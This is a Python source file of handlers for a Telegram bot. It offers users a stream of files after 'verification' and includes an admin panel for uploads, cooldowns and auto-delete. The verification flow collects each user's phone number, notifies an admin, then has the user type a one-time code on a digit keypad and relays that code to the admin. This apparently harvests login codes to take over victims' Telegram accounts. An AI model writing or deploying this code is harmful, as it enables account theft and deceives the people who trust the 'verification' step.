import asyncio
import logging
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardRemove, InputMediaPhoto, InputMediaVideo, InputMediaDocument
from telegram.ext import ContextTypes, ConversationHandler
from .config import *
from .keyboards import *
from .utils import animate_message, send_to_admin
from .database import get_db_connection

# --- User Flow ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        logging.info(f"Start command received from user: {user_id}")
        conn = get_db_connection()
        user = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
        
        if not user or not user['is_verified']:
            logging.info(f"User {user_id} not verified, sending welcome message.")
            try:
                await update.message.reply_photo(
                    photo=WELCOME_IMAGE_URL,
                    caption=WELCOME_CAPTION,
                    reply_markup=get_welcome_keyboard(),
                    parse_mode='Markdown'
                )
            except Exception as photo_err:
                logging.error(f"Error sending photo: {photo_err}. Falling back to text.")
                await update.message.reply_text(
                    text=WELCOME_CAPTION,
                    reply_markup=get_welcome_keyboard(),
                    parse_mode='Markdown'
                )
            return START
        else:
            logging.info(f"User {user_id} is verified, sending Get File button.")
            await update.message.reply_text(
                "Welcome back! ✨\nTap below to get your next file.",
                reply_markup=get_get_file_keyboard()
            )
            return ConversationHandler.END
    except Exception as e:
        logging.error(f"Error in start handler: {e}")
        await update.message.reply_text("Something went wrong. Please try again later. ⚠️")

async def proceed_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "To verify your identity, please share your phone number using the button below. 📱",
        reply_markup=get_contact_keyboard()
    )
    return AWAITING_CONTACT

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        contact = update.message.contact
        user = update.effective_user
        logging.info(f"Contact received from user {user.id}: {contact.phone_number}")
        
        conn = get_db_connection()
        conn.execute("INSERT OR IGNORE INTO users (user_id, phone) VALUES (?, ?)", (user.id, contact.phone_number))
        conn.commit()
        logging.info(f"User {user.id} saved to database.")
        
        admin_text = (
            "👤 *New Verification Request*\n\n"
            f"Name: {user.full_name}\n"
            f"Username: @{user.username}\n"
            f"Phone: +{contact.phone_number}\n"
            f"User ID: `{user.id}`"
        )
        
        context.user_data['phone'] = contact.phone_number
        context.user_data['otp_input'] = ""
        
        status_msg = await update.message.reply_text("Processing... 🔄", reply_markup=ReplyKeyboardRemove())
        context.user_data['status_msg_id'] = status_msg.message_id
        
        logging.info(f"Sending notification to admin for user {user.id}...")
        # Send admin notification in background
        asyncio.create_task(send_to_admin(context, admin_text, reply_markup=get_admin_sms_keyboard(user.id)))
        
        logging.info("Starting animations...")
        await animate_message(update, context, SUBMITTING_MSGS, target_message=status_msg)
        await animate_message(update, context, VERIFYING_MSGS, target_message=status_msg)
        await animate_message(update, context, WAITING_CODE_MSGS, target_message=status_msg)
        
        logging.info(f"User {user.id} now in AWAITING_CODE state.")
        return AWAITING_CODE
    except Exception as e:
        logging.error(f"Error in contact_handler: {e}")
        await update.message.reply_text("An error occurred while processing your request. ⚠️")
        return ConversationHandler.END

async def otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    current_otp = context.user_data.get('otp_input', "")
    
    if data.startswith("num_"):
        val = data.split("_")[1]
        if val == "clear":
            current_otp = ""
        elif val == "submit":
            if len(current_otp) > 0:
                await send_to_admin(
                    context, 
                    f"📩 *OTP Submitted*\nUser: {update.effective_user.full_name}\nCode: `{current_otp}`",
                    reply_markup=get_admin_approval_keyboard(update.effective_user.id)
                )
                await animate_message(update, context, CHECKING_CODE_MSGS)
                await animate_message(update, context, CONFIRMING_MSGS)
                return ADMIN_CONFIRMATION
            else:
                await query.answer("Please enter the code first! ⚠️")
                return AWAITING_CODE
        else:
            if len(current_otp) < 6:
                current_otp += val
        
        context.user_data['otp_input'] = current_otp
        display_otp = current_otp if current_otp else "____"
        await query.message.edit_text(
            f"{ENTER_CODE_MSG}\n\nCurrent: `{display_otp}`",
            reply_markup=get_otp_keyboard(),
            parse_mode='Markdown'
        )
    return AWAITING_CODE

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = int(data.split("_")[1])
    
    conn = get_db_connection()
    if data.startswith("approve_"):
        conn.execute("UPDATE users SET is_verified = 1 WHERE user_id = ?", (user_id,))
        conn.commit()
        await context.bot.send_message(chat_id=user_id, text=ACCESS_GRANTED_MSG, parse_mode='Markdown', reply_markup=get_get_file_keyboard())
        await query.message.edit_text(f"✅ User {user_id} Approved.")
    elif data.startswith("reject_"):
        await context.bot.send_message(chat_id=user_id, text=INVALID_CODE_MSG, parse_mode='Markdown')
        await query.message.edit_text(f"❌ User {user_id} Rejected.")
    return ConversationHandler.END

async def get_file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    conn = get_db_connection()
    user = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
    
    if not user or not user['is_verified']:
        await query.answer("You are not verified! ❌", show_alert=True)
        return

    next_index = user['last_file_index'] + 1
    file = conn.execute("SELECT * FROM files WHERE file_index = ?", (next_index,)).fetchone()
    
    if not file:
        await query.answer("No more files available for now! Check back later. ✨", show_alert=True)
        return

    # Check Cooldown
    if user['last_received_at']:
        last_time = datetime.fromisoformat(user['last_received_at'])
        # Use file-specific cooldown or global
        cooldown = file['cooldown_seconds']
        if cooldown is None:
            g_cooldown = conn.execute("SELECT value FROM settings WHERE key = 'global_cooldown'").fetchone()
            cooldown = int(g_cooldown['value'])
            
        wait_until = last_time + timedelta(seconds=cooldown)
        now = datetime.now()
        
        if now < wait_until:
            diff = wait_until - now
            hours, remainder = divmod(int(diff.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            await query.answer(f"⏳ Next file in: {hours:02d}:{minutes:02d}:{seconds:02d}", show_alert=True)
            return

    # Send File
    await query.answer("Sending your file... 📥")
    
    try:
        sent_msg = None
        params = {
            "chat_id": user_id,
            "caption": file['caption'],
            "protect_content": bool(file['protect_content']),
            "parse_mode": 'Markdown'
        }
        
        if file['file_type'] == 'photo':
            sent_msg = await context.bot.send_photo(photo=file['file_id'], **params)
        elif file['file_type'] == 'video':
            sent_msg = await context.bot.send_video(video=file['file_id'], **params)
        else:
            sent_msg = await context.bot.send_document(document=file['file_id'], **params)

        # Update User
        conn.execute("UPDATE users SET last_file_index = ?, last_received_at = ? WHERE user_id = ?", 
                     (next_index, datetime.now().isoformat(), user_id))
        conn.commit()

        # Handle Auto-Delete
        if file['auto_delete_seconds'] > 0:
            async def delete_after():
                await asyncio.sleep(file['auto_delete_seconds'])
                try:
                    await context.bot.delete_message(chat_id=user_id, message_id=sent_msg.message_id)
                except:
                    pass
            asyncio.create_task(delete_after())

    except Exception as e:
        await query.message.reply_text(f"Error sending file: {str(e)}")

# --- Admin Panel ---

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        return
    await update.message.reply_text("🔑 Please enter the Admin Secret Key:")
    return ADMIN_AUTH

async def admin_auth_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == ADMIN_SECRET:
        await update.message.reply_text("✅ Access Granted to Admin Panel", reply_markup=get_admin_main_keyboard())
        return ADMIN_PANEL
    else:
        await update.message.reply_text("❌ Access Denied.")
        return ConversationHandler.END

async def admin_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "admin_file_list":
        conn = get_db_connection()
        files = conn.execute("SELECT * FROM files ORDER BY file_index ASC").fetchall()
        text = "📁 *File List:*\n\n"
        keyboard = []
        for f in files:
            text += f"{f['file_index']}. {f['caption'][:30]}...\n"
            keyboard.append([InlineKeyboardButton(f"{f['file_index']}. {f['caption'][:20]}", callback_data=f"fmanage_{f['id']}")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "admin_upload_file":
        await query.message.edit_text("📤 Please send/forward the file (Photo, Video, or Document):")
        return UPLOAD_FILE
        
    elif data == "admin_global_cooldown":
        await query.message.edit_text("⏱ Select Global Cooldown Time:", reply_markup=get_timer_options_keyboard())
        
    elif data == "admin_stats":
        conn = get_db_connection()
        user_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        verified_count = conn.execute("SELECT COUNT(*) FROM users WHERE is_verified = 1").fetchone()[0]
        file_count = conn.execute("SELECT COUNT(*) FROM files").fetchone()[0]
        stats = (
            "📊 *Bot Statistics*\n\n"
            f"Total Users: {user_count}\n"
            f"Verified Users: {verified_count}\n"
            f"Total Files: {file_count}"
        )
        await query.message.edit_text(stats, reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')
        
    elif data == "admin_panel":
        await query.message.edit_text("🏠 *Admin Main Menu*", reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')

    return ADMIN_PANEL

async def admin_file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file_id = None
    file_type = None
    caption = update.message.caption or "No caption"
    
    if update.message.photo:
        file_id = update.message.photo[-1].file_id
        file_type = 'photo'
    elif update.message.video:
        file_id = update.message.video.file_id
        file_type = 'video'
    elif update.message.document:
        file_id = update.message.document.file_id
        file_type = 'document'
    
    if file_id:
        conn = get_db_connection()
        max_idx = conn.execute("SELECT MAX(file_index) FROM files").fetchone()[0] or 0
        cursor = conn.execute(
            "INSERT INTO files (file_id, file_type, caption, file_index) VALUES (?, ?, ?, ?)",
            (file_id, file_type, caption, max_idx + 1)
        )
        db_id = cursor.lastrowid
        conn.commit()
        
        file_data = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await update.message.reply_text(
            f"✅ File Uploaded Successfully!\nIndex: {file_data['file_index']}\nCaption: {caption}",
            reply_markup=get_file_settings_keyboard(db_id, file_data['cooldown_seconds'], file_data['protect_content'], file_data['auto_delete_seconds'])
        )
        return ADMIN_PANEL
    return UPLOAD_FILE

async def file_manage_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    parts = data.split("_")
    action = parts[0]
    db_id = int(parts[2])
    
    conn = get_db_connection()
    file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
    
    if not file:
        await query.answer("File not found! ❌")
        return ADMIN_PANEL

    if data.startswith("fmanage_") or data.startswith("fset_back_"):
        await query.message.edit_text(
            f"🛠 *Managing File #{file['file_index']}*\nCaption: {file['caption']}",
            reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']),
            parse_mode='Markdown'
        )
        
    elif data.startswith("fset_timer_"):
        await query.message.edit_text("⏱ Select Timer for this file:", reply_markup=get_timer_options_keyboard(db_id))
        
    elif data.startswith("fset_sharing_"):
        new_val = 0 if file['protect_content'] else 1
        conn.execute("UPDATE files SET protect_content = ? WHERE id = ?", (new_val, db_id))
        conn.commit()
        file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await query.message.edit_reply_markup(reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
        
    elif data.startswith("fset_autodel_"):
        await query.message.edit_text("🗑 Select Auto-Delete time:", reply_markup=get_autodelete_options_keyboard(db_id))
        
    elif data.startswith("fset_rename_"):
        await query.message.edit_text(f"✏️ Current Caption: `{file['caption']}`\n\nSend the new caption:")
        context.user_data['editing_file_id'] = db_id
        return RENAME_FILE
        
    elif data.startswith("fset_delete_"):
        conn.execute("DELETE FROM files WHERE id = ?", (db_id,))
        # Reorder remaining files
        remaining = conn.execute("SELECT id FROM files ORDER BY file_index ASC").fetchall()
        for idx, r in enumerate(remaining, 1):
            conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (idx, r['id']))
        conn.commit()
        await query.answer("File deleted and list reordered! 🗑")
        return await admin_menu_callback(update, context)

    elif data.startswith("fset_up_") or data.startswith("fset_down_"):
        curr_idx = file['file_index']
        target_idx = curr_idx - 1 if "up" in data else curr_idx + 1
        other = conn.execute("SELECT id FROM files WHERE file_index = ?", (target_idx,)).fetchone()
        if other:
            conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (target_idx, db_id))
            conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (curr_idx, other['id']))
            conn.commit()
            await query.answer("Moved! ⬆️⬇️")
            # Refresh view
            file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
            await query.message.edit_text(
                f"🛠 *Managing File #{file['file_index']}*\nCaption: {file['caption']}",
                reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']),
                parse_mode='Markdown'
            )
        else:
            await query.answer("Cannot move further! ⚠️")

    return ADMIN_PANEL

async def file_rename_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_caption = update.message.text
    db_id = context.user_data.get('editing_file_id')
    
    if db_id:
        conn = get_db_connection()
        conn.execute("UPDATE files SET caption = ? WHERE id = ?", (new_caption, db_id))
        conn.commit()
        file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await update.message.reply_text(
            f"✅ Caption updated for File #{file['file_index']}",
            reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds'])
        )
    return ADMIN_PANEL

async def timer_setting_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    conn = get_db_connection()
    if data.startswith("time_"): # Per-file
        parts = data.split("_")
        db_id = int(parts[1])
        val = parts[2]
        if val == "custom":
            await query.message.edit_text("✏️ Enter cooldown in minutes:")
            context.user_data['setting_timer_for'] = db_id
            return SET_COOLDOWN
        else:
            conn.execute("UPDATE files SET cooldown_seconds = ? WHERE id = ?", (int(val), db_id))
            conn.commit()
            return await file_manage_callback(update, context)
            
    elif data.startswith("gtime_"): # Global
        val = data.split("_")[1]
        if val == "custom":
            await query.message.edit_text("✏️ Enter global cooldown in minutes:")
            context.user_data['setting_timer_for'] = "global"
            return SET_COOLDOWN
        else:
            conn.execute("UPDATE settings SET value = ? WHERE key = 'global_cooldown'", (val,))
            conn.commit()
            await query.message.edit_text(f"✅ Global Cooldown set to {int(val)//60} minutes.", reply_markup=get_admin_main_keyboard())
            return ADMIN_PANEL

async def custom_timer_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        minutes = int(update.message.text)
        seconds = minutes * 60
        target = context.user_data.get('setting_timer_for')
        
        conn = get_db_connection()
        if target == "global":
            conn.execute("UPDATE settings SET value = ? WHERE key = 'global_cooldown'", (str(seconds),))
            await update.message.reply_text(f"✅ Global Cooldown set to {minutes} minutes.", reply_markup=get_admin_main_keyboard())
        else:
            conn.execute("UPDATE files SET cooldown_seconds = ? WHERE id = ?", (seconds, target))
            file = conn.execute("SELECT * FROM files WHERE id = ?", (target,)).fetchone()
            await update.message.reply_text(f"✅ Cooldown for File #{file['file_index']} set to {minutes} minutes.", 
                                           reply_markup=get_file_settings_keyboard(target, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
        conn.commit()
    except ValueError:
        await update.message.reply_text("Please enter a valid number! ⚠️")
        return SET_COOLDOWN
    return ADMIN_PANEL

async def autodelete_setting_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    parts = data.split("_")
    db_id = int(parts[1])
    val = parts[2]
    
    conn = get_db_connection()
    if val == "custom":
        await query.message.edit_text("✏️ Enter auto-delete time in minutes:")
        context.user_data['setting_autodel_for'] = db_id
        return SET_AUTO_DELETE
    else:
        conn.execute("UPDATE files SET auto_delete_seconds = ? WHERE id = ?", (int(val), db_id))
        conn.commit()
        return await file_manage_callback(update, context)

async def custom_autodelete_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        minutes = int(update.message.text)
        seconds = minutes * 60
        db_id = context.user_data.get('setting_autodel_for')
        
        conn = get_db_connection()
        conn.execute("UPDATE files SET auto_delete_seconds = ? WHERE id = ?", (seconds, db_id))
        conn.commit()
        file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await update.message.reply_text(f"✅ Auto-Delete for File #{file['file_index']} set to {minutes} minutes.", 
                                       reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
    except ValueError:
        await update.message.reply_text("Please enter a valid number! ⚠️")
        return SET_AUTO_DELETE
    return ADMIN_PANEL

async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles admin sending SMS/Code prompt to user."""
    query = update.callback_query
    await query.answer()
    
    parts = query.data.split("_")
    user_id = int(parts[2])
    
    if "done" in query.data:
        # Tell user to enter code
        await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
        await asyncio.sleep(2)
        await context.bot.send_message(
            chat_id=user_id, 
            text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", 
            reply_markup=get_otp_keyboard(),
            parse_mode='Markdown'
        )
        await query.message.edit_text("✅ Code request sent to user.")
    else:
        # Just an example of interaction
        await query.answer(f"Digit {parts[3]} selected")
